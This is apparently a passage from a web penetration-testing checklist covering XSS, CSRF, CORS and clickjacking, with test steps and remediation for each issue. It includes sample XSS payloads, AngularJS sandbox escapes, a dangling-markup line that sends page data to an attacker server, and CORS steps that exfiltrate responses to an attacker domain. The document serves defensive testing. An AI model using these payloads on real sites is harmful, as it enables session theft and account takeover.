XSS lets an attacker **execute arbitrary JavaScript in a victim's browser**, circumventing the same-origin policy and masquerading as the victim (accessing any data the victim can, triggering any action, and potentially gaining full control over the application). XSS can be **reflected**, **stored** (persistent/second-order), or **DOM-based** (vulnerability in client-side code). Impact is usually high/critical; exploitability depends on the context in which attacker-controlled data is reflected.

**Two-layer prevention:** (1) **Encode data on output** — context-specific escaping applied directly before writing to the page; (2) **Validate input on arrival** — whitelist-based, blocking (not "cleaning") invalid input. CSP is the last line of defense.

---

### VUL-XSS-0001 — Reflected XSS

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Reflection of user input in the HTTP response without safe encoding, executed when the victim opens a crafted URL.

**Test Steps:**

1. Submit a unique, alphanumeric string to each parameter/entry point (query string, body, file path, headers).
2. Locate every place the string appears in the response.
3. For each location, determine the context (see VUL-XSS-0004/0005/0006) and try to break out of it with a small exploit payload.
4. If angle brackets are filtered, test whether you can use alternate vectors (events, raw encoding, JavaScript context).

**Key observations to record:** echoed locations + context (HTML body, attribute, JS string, etc.); effective encoding applied at each.

**Remediation:**

- Output-encode data directly before it is written, using context-appropriate encoding (HTML entities in HTML contexts, Unicode `\uXXXX` escaping in JS string contexts, multiple encoding layers in layered contexts).
- Input-validate with whitelists (safe protocols, expected characters/type); block invalid input rather than trying to clean it.

---

### VUL-XSS-0002 — Stored (persistent / second-order) XSS

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Data from an untrusted source (comments, nicknames, contact details, imported messages/etc.) is stored and later included in HTTP responses unsafely — executed for every visitor of the affected page. May receive data from non-HTTP sources (email bodies, packet data, other user-generated content).

**Test Steps:**

1. Map all "entry points" where attacker-controllable data enters processing (forms, imports, API ingestion).
2. Map all "exit points" where that data appears in responses (reflections for other users, admin views, exports).
3. Submit a benign unique token at each entry point and hunt for it at every exit point.
4. For each exit context, attempt the breakout/exploit payload and confirm execution in a victim browser.

**Key observations to record:** entry point → exit point flows; contexts; persistence across sessions.

**Remediation:**

- Same output encoding + input validation as reflected XSS, applied at every exit point for stored data.
- Sanitize rich content server-side or with a well-maintained library (e.g. DOMPurify); monitor for library CVEs.

---

### VUL-XSS-0003 — DOM-based XSS (sinks & sources)

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Client-side JavaScript takes data from an attacker-controllable **source** (URL `location`, `document.referrer`, `document.cookie`, web messages, `postMessage`) and passes it to a **sink** that supports dynamic code execution (`eval()`, `innerHTML`, `document.write`, `setTimeout`, `location` writes…). Also possible through third-party libraries (jQuery `attr()`, selector/HTML sinks). No server-side reflection needed.

**Test Steps:**

1. Identify candidate sources in client-side JS (URL params, fragment, cookies, web messages).
2. For HTML sinks: inject a unique string into the source, search the DOM for it, and test each location (attribute, element, script) for breakout/exploitation.
3. For JS-execution sinks: use the JS debugger, set a breakpoint at the sink, follow source→variable→sink taint flow, and refine input to deliver a working payload.
4. Check third-party libraries/frameworks for additional sinks (`attr()`, selector functions, AngularJS expressions).
5. Use DOM Invader to automate source/sink detection and payload delivery.

**Key observations to record:** reachable source→sink paths; sink type; effective filters/encodings along the path.

**Remediation:**

- Avoid flows from untrusted sources to dangerous sinks entirely; where unavoidable, whitelist-validate or context-safely encode (JS/HTML/URL escaping in the right sequence) in client-side code.
- Canonicalize the input with the *same* decoder used by the sink before validating.

---

### VUL-XSS-0004 — XSS between HTML tags

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Attacker-controlled data is placed in the HTML **body** between tags (e.g. a `<div>` or `<p>`), where breaking a `<` allows injection of a new element that runs the payload on load.

**Test Steps:**

1. Confirm data lands between tags.
2. Test whether `<` and `>` are reflected literally. If so, inject:
    - `<script>alert(1)</script>` (if inline scripts allowed),
    - `<img src=x onerror=alert(1)>` (strict CSP / tag filter workaround),
    - `<svg onload=alert(1)>`.
3. Iterate based on which characters survive and what filters exist.

**Key observations to record:** characters reflected raw; working payload; CSP inline-script policy.

**Remediation:**

- HTML-encode data before placement between tags (convert `<`→`&lt;`, `>`→`&gt;`, etc.) directly at output time.

---

### VUL-XSS-0005 — XSS in HTML tag attribute contexts

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Data lands inside an HTML tag attribute (e.g. `value="..."`, `href="..."`, event handler attributes). You may not need angle brackets — breaking the quote can inject new attributes (`onmouseover`, `onfocus`) or `autofocus`-based vectors.

**Test Steps:**

1. Confirm the attribute context (double vs single quotes, backticks, or unbounded).
2. Try breaking out of the attribute with `"` (or `'`/```) and injecting a new attribute/element.
3. If the tag closes after the attribute (no chance for other attributes), inject `autofocus onfocus=alert(1) //` or an event that fires immediately.
4. If angle brackets are HTML-encoded but quotes are not, use the event-handler vector.

**Key observations to record:** quote type; whether angle-bracket encoding is present; whether quotes are escaped.

**Remediation:**

- HTML-encode the data with `ENT_QUOTES` behavior (encode both quote types) in attribute contexts; for `javascript:`capable attributes (href/src), also validate the scheme against a whitelist (http/https only).
- Consider not placing user data inside attribute event handlers at all.

---

### VUL-XSS-0006 — XSS into JavaScript / execution contexts

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Data is embedded in a JavaScript context (inside a string literal of a `<script>` block, an event handler, `onclick`, etc.). HTML encoding of `<`/`>` is irrelevant — the attacker escapes the string/closure and executes code.

**Test Steps:**

1. Confirm the JS context (single/double/backtick quoted string, or directly evaluated).
2. Try breaking out of a quoted string: `'-alert(1)-'`, `';alert(1)//` and variants depending on which characters are escaped.
3. When quotes/slashes are escaped, try breaking the closure first: `</script><img src=x onerror=alert(1)>` (escape the script block), or use `\` tricks and `JSON.parse`/backslash sequences to defeat the string terminator.
4. For event-handler attributes that also HTML-encode — layer both encodings (e.g. Unicode-escape then HTML-encode for handlers like `onclick="x='...'"`).

**Key observations to record:** escaping filters on quotes/backslash; possibility of breaking the `</script>` closure; HTML+JS layered encoding needs.

**Remediation:**

- In JS string contexts, Unicode-escape non-alphanumeric values (`\u003c`, `\u003e`…). Never unescape before inserting into a JS string.
- Escape the `</script>` sequence as a first step when embedding inside a `<script>` block.
- Use template engines' built-in escaping (Twig `e('js')`, etc.) and avoid manual string concatenation.

---

### VUL-XSS-0007 — XSS in JavaScript template literals / client-side template injection

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Data is inserted into a JS template literal (backticks) or into a client-side template expression. In template literals, `${...}` interpolation executes expressions. In client-side template injection (custom templating frameworks), expressions are evaluated with full access to global objects; AngularJS (via `ng-app`) executes code inside `{{...}}` — allowing XSS even when angle brackets and quotes are HTML-encoded.

**Test Steps:**

1. Template literal: inject `${alert(1)}` (or using online sandbox bypasses) inside the backtick string.
2. Client-side template (custom frameworks): enumerate the template syntax; try framework-native expression gadgets to reach code execution (e.g. AngularJS `{{$on.constructor('alert(1)')()}}`).
3. AngularJS: apply when a page uses `ng-app`; test `{{7*7}}` evaluation first, then escalate to expression payloads.
4. For Unicode-escaped variants, test filters that block the literal strings.

**Key observations to record:** whether `${}`/template expressions execute; which framework; available gadgets.

**Remediation:**

- Never interpolate untrusted data into template literals or client-side templates without encoding/whitelisting.
- If AngularJS/custom templating is not needed, remove it; otherwise sandbox with a recent framework version and CSP.

---

### VUL-XSS-0008 — AngularJS sandbox evasion (XSS without angle brackets)

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Where a framework like AngularJS processes expressions (inside double curly braces that can appear in HTML or attributes), an attacker can execute JavaScript **without any angle brackets or events** — bypassing filters that HTML-encode `<`, `>`, and quotes. Legacy AngularJS sandboxes can be escaped in multiple documented ways.

**Test Steps:**

1. Detect AngularJS: page uses the `ng-app` attribute.
2. Insert an expression like `{{7*7}}` in an unencoded position and confirm evaluation (`49`).
3. Escalate with a known AngularJS 1.x sandbox escape (e.g. `{{$on.constructor('alert(1)')()}}`), adapting for the library version.
4. Try within attributes (e.g. `{{...}}` in an `ng-attr-*` location) where HTML encoding of angle brackets/quotes is otherwise applied.

**Key observations to record:** sandboxable constructs; evaluated expressions.

**Remediation:**

- Do not use deprecated AngularJS (1.x) with user-controllable expression input; migrate to a supported framework with automatic escaping.
- If it must stay, apply strict output encoding + a strict CSP (see VUL-XSS-0010).

---

### VUL-XSS-0009 — Dangling markup injection (sensitive data capture)

**Severity:** Medium
**Status:** PENDING
**Category:** XSS

**Description:** When full XSS is blocked (filters, CSP), an attacker can still inject an incomplete/unterminated tag (e.g. `<img src='//attacker?`) that makes the browser treat everything up to a later quote as part of the image URL and send it to the attacker's server. Captures a portion of the response after the injection point — potentially CSRF tokens, emails, financial data.

**Test Steps:**

1. Identify a reflection point where `<`/`>` survive but script execution is blocked.
2. Inject a dangling markup payload: `<img src='<https://attacker-server/?'`> leaving the `src` attribute open.
3. Confirm the browser "looks ahead" and appends subsequent response characters (up to the next single quote) to the request to the attacker server (observe the request at your collector).
4. Use a working vector, then review which sensitive values (CSRF tokens, etc.) get captured.

**Key observations to record:** captured trailing content; sensitive tokens leaked to the collector.

**Remediation:**

- HTML-encode `<`, `>`, `"`, `'`, and `&` at output (prevents dangling-open attribute vectors).
- Add CSP + `Referrer-Policy` hardening; treat dangling markup as a data-leak vector even when no script executes.

---

### VUL-XSS-0010 — Content Security Policy bypass (policy injection / weak CSP)

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** A CSP that is incomplete, misconfigured, or built from user-influenced directives can be bypassed, letting an attacker execute injected payloads despite the policy. Common gaps: allowing `unsafe-inline`/`'unsafe-eval'`, permissive script-src domains, object-src wildcards, or CSP-reflection (policy injection).

**Test Steps:**

1. Read the `Content-Security-Policy` (and `Content-Security-Policy-Report-Only`) headers on vulnerable pages.
2. Identify bypasses: inline scripts allowed (`unsafe-inline`); `eval` allowed; whitelisted CDN hosts you can upload to; `object-src`/`base-uri` not restricted (base-tag injection); permissive `script-src` with JSONP endpoints.
3. Test AngularJS-specific escapes where AngularJS is present (framework expressions bypass many CSPs).
4. Test CSP policy injection if any policy value reflects user input (inject extra directives).
5. If images are allowed but scripts blocked, use `img` elements (or `<a ping>`) to exfiltrate tokens/data.

**Key observations to record:** CSP header contents; directives allowing inline/eval/external hosts; reflection of user input into the policy.

**Remediation:**

- Deploy a strict CSP, e.g. `default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';`
- Never reflect user input into policy directives; use nonce- or hash-based script allowlists for external scripts; host third-party scripts on your own domain where possible.
- Layer CSP with correct output encoding (CSP is last-line defense, not a replacement).

---

### VUL-XSS-0011 — Exploiting XSS for impact (cookie theft, password capture, CSRF bypass)

**Severity:** High
**Status:** PENDING
**Category:** XSS

**Description:** Once XSS executes, the attacker can assume the victim's session: read `document.cookie` (where `HttpOnly` is not set), run a fake login form to **capture passwords**, and **bypass CSRF defenses** by reading tokens from the page and issuing authenticated requests ("two-way" capability that plain CSRF lacks).

**Test Steps:**

1. Steal cookies: payload reading `document.cookie` and exfiltrating to a collector; confirm the session cookie lacks `HttpOnly`.
2. Capture passwords: inject a keylogger or a fake login form that posts credentials to the attacker.
3. Bypass CSRF: use the XSS to fetch the protected page, extract the CSRF token, and submit it with the state-changing request (e.g. change victim email → password reset → account takeover).
4. Trigger higher-impact actions the user can perform (sending messages, transfers, accepting requests).

**Key observations to record:** exfiltrated cookies/tokens/credentials; end-to-end session takeover chain.

**Remediation:**

- Fix the underlying XSS (categories 0001–0010) — exploitation hardening alone is insufficient.
- Set `HttpOnly; Secure; SameSite` on session cookies to reduce (but not eliminate) impact.
- Keep CSRF tokens robust (see Category I) so XSS-free pages remain protected.

---

## XSS — General Remediation Principles (cross-cutting)

- **Two layers of defense:** encode on output (context-correct) + whitelist-validate input on arrival; block invalid input instead of cleaning it.
- Context encoding: HTML entity encoding in HTML contexts; Unicode `\uXXXX` escaping in JS contexts; layered encoding (JS then HTML) inside event handlers; escape `</script>` when embedding in script blocks.
- Sanitize rich HTML with a maintained library (DOMPurify) or prefer markdown + strict rendering; monitor for CVEs.
- Prefer template engines with built-in escaping; never concatenate user input into templates manually.
- Deploy a strict CSP as the last line of defense; verify it can't be bypassed (no `unsafe-inline`/`unsafe-eval`, restricted `object-src`/`base-uri`, nonce/hash for external scripts).

---

# CATEGORY I: CROSS-SITE REQUEST FORGERY (CSRF)

## Background

CSRF induces a victim to perform unintended state-changing actions. Since requests carrying session cookies are sent automatically, the attack succeeds where the app trusts the session without verifying the request's *intent*. Common defenses: **CSRF tokens**, **SameSite cookies**, and **Referer-based validation** — each is bypassable when misconfigured.

**XSS vs CSRF:** XSS executes JS in the victim's browser; CSRF only induces requests (one-way). A successful XSS defeats CSRF tokens entirely (tokens are readable in responses).

---

### VUL-CSRF-0001 — CSRF on state-changing requests (no defense)

**Severity:** High
**Status:** PENDING
**Category:** CSRF

**Description:** A sensitive action (account change, password reset trigger, transaction, settings) is performed via requests that carry the session cookie but require no anti-CSRF token — a cross-site page can trigger it by submitting a form or (for JSON/GET actions) a crafted request.

**Test Steps:**

1. Identify every state-changing request (methods POST/PUT/PATCH/DELETE and GET-with-side-effects).
2. Remove any token/custom headers and resend — if the action is accepted, there is no CSRF protection.
3. Deliver a cross-site PoC of the request (an HTML form auto-submitting to the target) from a different origin in a victim's browser and observe the effect.

**Key observations to record:** actions vulnerable with no token; whether they run with the victim's cookies cross-site.

**Remediation:**

- Add a robust CSRF token to every state-changing request (see 0002–0006 prerequisites).
- Set explicit SameSite restrictions on session cookies (Strict by default; Lax if needed; never `None` without a solid reason).

---

### VUL-CSRF-0002 — CSRF token validation depends on request method

**Severity:** High
**Status:** PENDING
**Category:** CSRF

**Description:** Token validation is performed only for some request methods (commonly only POST), so switching the method (GET/DELETE, etc.) bypasses validation while the action is still performed.

**Test Steps:**

1. Perform the action via its normal method and note token behavior.
2. Resend the same action with a different HTTP method (and no token) — if it succeeds, validation was method-dependent (for GET-based actions, verify with a cross-site image/form).

**Key observations to record:** which method(s) skip validation.

**Remediation:**

- Validate the CSRF token regardless of HTTP method (and content type). Reject requests with a missing token exactly like an invalid token.

---

### VUL-CSRF-0003 — CSRF token validation depends on token presence

**Severity:** High
**Status:** PENDING
**Category:** CSRF

**Description:** The application validates the token only when the parameter/header is present; omitting the token entirely bypasses the check (simply confirm the action processes without it).

**Test Steps:**

1. Capture the request for a sensitive action.
2. Remove the CSRF token (parameter and/or header) entirely and resend.
3. If the action succeeds, validation is presence-dependent.

**Key observations to record:** whether a token-less request is accepted.

**Remediation:**

- Validate the token on every request; treat a missing token as an invalid token and reject.
- For extra safety, place the hidden token field early in the HTML form, before any user-controllable content.

---

### VUL-CSRF-0004 — CSRF token not tied to the user session

**Severity:** High
**Status:** PENDING
**Category:** CSRF

**Description:** The token is valid for the whole application rather than the user's session, so a token obtained from an attacker account (or any account) is accepted for the victim's requests — a token-less CSRF in practice.

**Test Steps:**

1. Log in as yourself, capture your token.
2. In a separate (victim/test) session, submit the state-changing request using your token — if accepted, tokens are not session-bound.
3. Confirm the cross-user scenario by forging the request from an attacker page using the stolen token.

**Key observations to record:** cross-session token reuse.

**Remediation:**

- Store the token in the server-side session and bind validation to the session; verify the submitted token matches the current session's token.

---

### VUL-CSRF-0005 — CSRF token tied to a non-session (attacker-settable) cookie

**Severity:** High
**Status:** PENDING
**Category:** CSRF

**Description:** The token is tied to a cookie, but not the session cookie (e.g. a separate cookie set by a different framework). If the attacker can set that cookie value (e.g. through a subdomain cookie injection, cached header, or cookie-setting flaw), they can pair a token they control with a cookie they control.

**Test Steps:**

1. Determine which cookie the CSRF token is validated against.
2. Test whether that cookie can be set/modified cross-site (subdomain cookie injection, `HostOnly` absent, etc.) and whether the server reflects/uses it.
3. Supply an attacker-set cookie + matching token and confirm the action succeeds.

**Key observations to record:** cookie vs token binding; ability to set the binding cookie cross-site.

**Remediation:**

- Bind the CSRF token to the same session cookie the app uses for authentication; use one framework for both session and CSRF.
- Never transmit CSRF tokens inside cookies.

---

### VUL-CSRF-0006 — CSRF double-submit cookie (token duplicated in cookie)

**Severity:** Medium
**Status:** PENDING
**Category:** CSRF

**Description:** The "double submit" defense stores no server state: it only checks that the token in the request body matches the token in a cookie. If the cookie itself is attacker-settable (or via a sibling subdomain), the attacker can include a matching (forged) pair.

**Test Steps:**

1. Identify that validation compares a request-parameter token with a cookie token.
2. Determine whether the cookie domain/path allows attacker control (e.g. cookie domain `.example.com` vs app on `www`, or header injection elsewhere on the domain).
3. Craft a cross-site request that sets the attacker cookie (whether via subdomain or a first-step endpoint) and submits the matching token; confirm the action executes.

**Key observations to record:** double-submit pattern; attacker's ability to set the paired cookie.

**Remediation:**

- Prefer server-side session-bound tokens over the double-submit pattern.
- If double-submit is unavoidable, tie the token to the session and set the cookie with `HostOnly` + `Domain` scoping to the app's exact origin.

---

### VUL-CSRF-0007 — Referer-based CSRF defense bypass

**Severity:** Medium
**Status:** PENDING
**Category:** CSRF

**Description:** Defense validates the `Referer` (or `Origin`) header instead of a token. Bypass via (a) removing the header — some apps only block *bad* Referers, (b) a Referer containing the target domain as a subdomain/path (header not a parseable URL, or `/`-terminated check bypass), (c) meta `referrer-policy` controls from the attacker page.

**Test Steps:**

1. Determine which header is validated.
2. Send the request with no `Referer` — if accepted, header validation is incomplete.
3. Try a Referer like `https://attacker-website.com/` containing your target domain in the path (`https://normal-website.com.attacker.net/...`) and confirm the app's check is bypassable.
4. From an attacker page using the `referrerpolicy="unsafe-url"`/`no-referrer` meta, trigger the action with a crafted heading.

**Key observations to record:** header-based parsing logic; truncation/regex bypasses.

**Remediation:**

- Use CSRF tokens instead of Referer validation.
- If Referer-based validation must remain, validate with a strict allowlist of full origin, reject empty/missing headers, and require secure parsing (not substring matching).

---

### VUL-CSRF-0008 — SameSite restriction bypass (GET / method override / client redirect / sibling domains)

**Severity:** High
**Status:** PENDING
**Category:** CSRF

**Description:** Even with SameSite cookies, CSRF may be possible when: Lax allows top-level **GET** navigation requests (a GET state-change, or a GET-based gadget); the app honors **method override** headers/params; an **on-site gadget** emits a secondary same-site request (client-side redirect, form); or a **sibling subdomain** with its own XSS/redirect vulnerability is used to issue the request.

**Test Steps:**

1. Determine the cookie's SameSite level (Lax/Strict/None) for the session and other cookies.
2. **Lax + GET:** if a sensitive action works via GET (or a GET+refresh form), deliver it as a top-level navigation (`<a href>`, `replace()`).
3. **Method override:** if the app supports `X-HTTP-Method-Override`/`_method`, submit a cross-site form whose POST is re-interpreted as the dangerous method.
4. **Same-site gadget:** find a client-side redirect or form on the same site that lets you forge a secondary request (`location.hash`driven target, open redirect on the same site/domain).
5. **Sibling domain:** audit all sibling subdomains for XSS/open-redirect/request-emitting gadgets; chain cross-origin→same-site.
6. **SameSite=None / no attribute:** if a sensitive cookie has no SameSite attribute (or `None`), classic cross-site CSRF works directly.

**Key observations to record:** SameSite level per cookie; bypass gadgets available; GET-based state changes.

**Remediation:**

- Set SameSite=Strict by default on sensitive cookies; lower to Lax only when needed; never `SameSite=None` without a clear reason (and always `Secure`).
- Ensure sensitive actions are not reachable via GET; reject/ignore method-override headers.
- Audit and isolate sibling domains/insecure content (e.g. user uploads on a separate site), since cross-origin same-site requests bypass SameSite entirely.

---

## CSRF — General Remediation Principles (cross-cutting)

- Token requirements: unpredictable with high entropy, tied to the user's session, strictly validated in every case (regardless of method/content type), missing token = reject.
- Generate with a CSPRNG seeded with timestamp + static secret; optionally strengthen with user-specific entropy + hash.
- Transmit tokens in a hidden form field placed early in the HTML document — NOT in cookies, and preferably not in the query string (Referer/log exposure).
- Set explicit SameSite restrictions (Strict default) on all cookies; be wary of cross-origin, same-site attacks (isolate insecure content, audit sibling domains).
- Remember: CSRF tokens do not protect against stored XSS; any XSS can read tokens and defeat CSRF.

---

# CATEGORY J: CROSS-ORIGIN RESOURCE SHARING (CORS)

## Background

CORS is a controlled relaxation of the **same-origin policy** (SOP) using HTTP headers (`Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`/`Headers`, preflight via `OPTIONS`). Misconfigurations allow a malicious origin to **read responses** to cross-origin requests, exfiltrating sensitive data (API keys, CSRF tokens, user info). Note: CORS is **not** a CSRF defense; poorly configured CORS increases CSRF impact.

---

### VUL-CORS-0001 — CORS: arbitrary Origin reflection (`ACAO` mirrors unvalidated Origin)

**Severity:** High
**Status:** PENDING
**Category:** CORS

**Description:** The server reflects any `Origin` value in `Access-Control-Allow-Origin` (often together with `Access-Control-Allow-Credentials: true`), granting any domain read access to responses for authenticated requests.

**Test Steps:**

1. Send a request with an arbitrary `Origin: <https://evil-website.com`> and inspect for `Access-Control-Allow-Origin: <https://evil-website.com`> (plus `Access-Control-Allow-Credentials: true`).
2. Confirm which sensitive responses (user info, API keys, CSRF tokens) are accessible.
3. PoC: from an attacker page, `fetch(target, {credentials:'include'})` and exfiltrate the response body.

**Key observations to record:** reflected origin; credentials flag; sensitive data readable cross-origin.

**Remediation:**

- Do not dynamically reflect client-supplied origins. Only return `Access-Control-Allow-Origin` for a strict allowlist of trusted origins.
- If credentials are allowed, never combine with arbitrary reflection; always validate against the allowlist.

---

### VUL-CORS-0002 — CORS: trusted `null` origin

**Severity:** High
**Status:** PENDING
**Category:** CORS

**Description:** The server whitelists `null` in `Access-Control-Allow-Origin` (common for local development). Any sandboxed cross-origin request can carry `Origin: null`, letting an attacker frame the target in a sandboxed iframe (or use other null-origin tricks) to read responses.

**Test Steps:**

1. Send a request with `Origin: null`; if `Access-Control-Allow-Origin: null` + `Allow-Credentials: true` is returned, it's whitelisted.
2. PoC: host a page that renders a sandboxed iframe to the target (`sandbox="allow-scripts allow-forms"`), which sends `Origin: null`, and read the response; exfiltrate to the attacker domain.

**Key observations to record:** `null` reflected; cross-origin read with credentials.

**Remediation:**

- Never whitelist `null` in ACAO for sensitive resources; define trusted origins explicitly for private and public servers.

---

### VUL-CORS-0003 — CORS: whitelist / regex parsing bypass

**Severity:** High
**Status:** PENDING
**Category:** CORS

**Description:** Allowlist matching by prefix/suffix or regex is flawed (e.g. allowing `example.com` also matches `example.com.attacker.net`, or `attacker-example.com`), granting unintended origins access.

**Test Steps:**

1. Determine the allowlist rule by sending a variety of Origin values.
2. Test bypass candidates: `https://trusted.example.com.attacker.com`, `https://attacker.com.trusted.example.com`, `https://trusted.example.com@attacker.com` (userinfo), encoded forms, `https://trusted.example.com.evil.net`.
3. If a malicious origin passes, repeat the VUL-CORS-0001 PoC with credentials to read sensitive data.

**Key observations to record:** matching semantics (prefix/suffix/regex) and which bypass worked.

**Remediation:**

- Match exact origins (byte-for-byte where possible); do not use prefix/suffix/regex matching; validate userinfo and encoding forms.

---

### VUL-CORS-0004 — CORS: trust of XSS-vulnerable or insecure (HTTP) origins

**Severity:** High
**Status:** PENDING
**Category:** CORS

**Description:** "Correctly" configured CORS still trusts specific origins. If a trusted origin suffers XSS (or is reachable over plain HTTP), the attacker can run JS from that origin that uses the CORS grant to read the target's sensitive data. Also exploitable via MITM when the trusted origin allows HTTP.

**Test Steps:**

1. Enumerate the trusted origin(s) from the ACAO allowlist.
2. For each trusted origin, test for an XSS (or presence over HTTP + MITM on your test path).
3. From the XSS/MITM origin, issue a credentialed CORS request to the target and exfiltrate the response.
4. (MITM variant) intercept plain HTTP to the trusted origin; return a script that performs the CORS read.

**Key observations to record:** trusted origins; XSS/HTTP presence on a trusted origin.

**Remediation:**

- Only trust origins you fully control and that are hardened against XSS.
- Enforce TLS (HTTPS) for all trusted origins; avoid `Access-Control-Allow-Origin` grants over insecure protocols.
- Keep the same-origin policies of trusted subdomains sane (consistent XSS hygiene).

---

### VUL-CORS-0005 — CORS: intranet / no-credentials cross-origin proxy

**Severity:** Medium
**Status:** PENDING
**Category:** CORS

**Description:** Internal (intranet) applications trust resource requests from any origin without credentials (no `Access-Control-Allow-Credentials`). An external attacker page can still use the victim's browser as a proxy to read responses to *unauthenticated* internal resources (or resources behind IP-based protections), performing actions within the private network.

**Test Steps:**

1. Find an intranet/private-IP application (or an internal `reader`style proxy endpoint) with permissive ACAO (e.g.  or reflecting origins).
2. From an attacker-controlled page, query the internal URL with cross-origin fetch and read the response (HTML/JSON) — credentials not required.
3. Demonstrate the external-origin page can enumerate/read internal resources the victim can reach.

**Key observations to record:** internal resources reachable cross-origin; no credentials needed.

**Remediation:**

- Never use `Access-Control-Allow-Origin: *` (or unvalidated reflection) for internal/intranet resources; avoid wildcards in internal networks.
- Trusting network isolation alone is insufficient: enforce server-side auth/session checks on every internal resource.

---

## CORS — General Remediation Principles (cross-cutting)

- Properly specify `Access-Control-Allow-Origin` for any resource containing sensitive information; only trusted sites may be granted.
- Never dynamically reflect client-supplied origins without validation; never whitelist `null`; avoid wildcards in internal networks.
- CORS is not a substitute for server-side security: keep authentication/session/authorization protections on sensitive data regardless of CORS configuration.

---

# CATEGORY K: CLICKJACKING (UI REDRESSING)

## Background

Clickjacking tricks users into clicking actionable content on a **hidden** target rendered in an iframe layered under a decoy page (CSS opacity/z-index). CSRF tokens do **not** mitigate clickjacking, because the victim's session is real and all requests are on-domain — the difference is only that the interaction happens in a hidden iframe. Protection must be server-driven: `X-Frame-Options` and/or **CSP `frame-ancestors`**.

---

### VUL-CJK-0001 — Basic clickjacking (framing of sensitive page, incl. CSRF-token actions)

**Severity:** High
**Status:** PENDING
**Category:** Clickjacking

**Description:** A sensitive page (delete account, change settings, transfer, confirm dialog) can be framed by an attacker page. The victim clicks a decoy UI; their click lands on the hidden target's button, triggering the action with their valid session — even when CSRF tokens are used.

**Test Steps:**

1. Test the target response for framing headers: missing or weak `X-Frame-Options`, and `Content-Security-Policy` without `frame-ancestors` (or allowing unknown domains).
2. PoC: an attacker page with an invisible iframe of the target; overlay a decoy clickable element aligned with the target's action button.
3. Include the target's normal CSRF form/action (which works in-frame) and confirm the click triggers the real action in a browser session.

**Key observations to record:** presence/absence of framing restrictions; working overlay PoC.

**Remediation:**

- Send `X-Frame-Options: deny` (or `sameorigin`) on all state-changing/sensitive pages.
- Deploy CSP `frame-ancestors 'none'` (or `'self'`/explicit domains); ideally both for older browsers.
- Layer defenses; frame-busting client scripts alone are insufficient.

---

### VUL-CJK-0002 — Clickjacking with prefilled form input

**Severity:** Medium
**Status:** PENDING
**Category:** Clickjacking

**Description:** A framed page's forms can be prefilled with attacker-chosen values from URL parameters/state, so the hidden-action click submits attacker-controlled data (e.g. prefilled address/amount/email) alongside the normal action.

**Test Steps:**

1. Identify a framed page whose form inputs accept values from URL parameters (or can be set via query state).
2. PoC: iframe pointing to the target URL with prefilled parameters (e.g. a transfer amount), layered so the victim clicks "confirm".
3. Confirm the submitted action uses the attacker-supplied values.

**Key observations to record:** parameters that prefill inputs; resulting malicious action.

**Remediation:**

- Restrict framing (VUL-CJK-0001 remediation) on every page that renders forms.
- Re-validate critical values server-side independent of form state; treat prefilled inputs as untrusted.

---

### VUL-CJK-0003 — Frame-busting script bypass

**Severity:** Medium
**Status:** PENDING
**Category:** Clickjacking

**Description:** If protection relies solely on client-side frame-busting JavaScript, the `iframe sandbox` attribute (with `allow-forms`/`allow-scripts`, no `allow-top-navigation`) prevents the script from checking/escaping the top window, neutralizing the busting script.

**Test Steps:**

1. Determine whether protection is client-side (frame-busting script) rather than headers.
2. PoC: wrap the iframe with `<iframe sandbox="allow-forms allow-scripts">` and confirm the framed target can't escape and the clickjacking action still fires.

**Key observations to record:** reliance on client-side busting only.

**Remediation:**

- Use server-side framing controls (`X-Frame-Options` + CSP `frame-ancestors`) — never rely on JavaScript frame busters.

---

### VUL-CJK-0004 — Combining clickjacking with DOM XSS

**Severity:** High
**Status:** PENDING
**Category:** Clickjacking

**Description:** Clickjacking is chained with a DOM-XSS to bypass restrictions: the clickjacked action steers a "post-click" DOM-XSS flow, or the two are combined to turn an otherwise-protected action (or a complex one) into a fully scripted exploit.

**Test Steps:**

1. Find an exploitable DOM XSS (Category H, VUL-XSS-0003).
2. Combine with clickjacking so the victim click both triggers the DOM flow and the layered target action; deliver the final payload through the DOM sink.

**Key observations to record:** chained click→DOM-XSS→action path.

**Remediation:**

- Fix the underlying DOM XSS and apply framing restrictions to all pages involved in the chain.

---

### VUL-CJK-0005 — Multistep clickjacking

**Severity:** Medium
**Status:** PENDING
**Category:** Clickjacking

**Description:** Actions spanning multiple steps (or several confirmations/inputs across pages) are still clickjackable by dynamically repositioning the iframes/focus between clickjacked layers ("toggling" technique), so each click lands on the appropriate step.

**Test Steps:**

1. Map a multi-step sensitive flow (steps = separate pages/iframes).
2. PoC: several layered iframes whose visibility/positions change after each click to align each victim click with the next step's button.
3. Verify the full multi-step action completes under the victim's session.

**Key observations to record:** multi-step flow completion via layered redirects.

**Remediation:**

- Apply `X-Frame-Options` + CSP `frame-ancestors` on every page of the workflow; re-verify on each step.

---

## Clickjacking — General Remediation Principles (cross-cutting)

- Server-side constraints only: `X-Frame-Options` (`deny`, `sameorigin`, `allow-from`) and, preferably, CSP `frame-ancestors` (`'none'`, `'self'`, or explicit domains) — use both for older-browser coverage and because CSP validates the whole frame-parent chain.
- Apply to all pages that can be framed and have sensitive/state-changing functionality.
- Do not rely on frame-busting JavaScript; assume attackers can use the `sandbox` attribute.

---

# CATEGORY L: DOM-BASED VULNERABILITIES

## Background

DOM-based vulnerabilities arise when client-side JavaScript takes data from a **source** (URL `location`, `document.referrer`, `document.cookie`, web messages) and passes it unsafely to a **sink** (a property/function that performs a sensitive/executable operation). General prevention: **never let data from an untrusted source dynamically reach a sink**; where unavoidable, whitelist-validate or context-appropriately encode (JS/HTML/URL escaping in the right sequence) in client-side code.

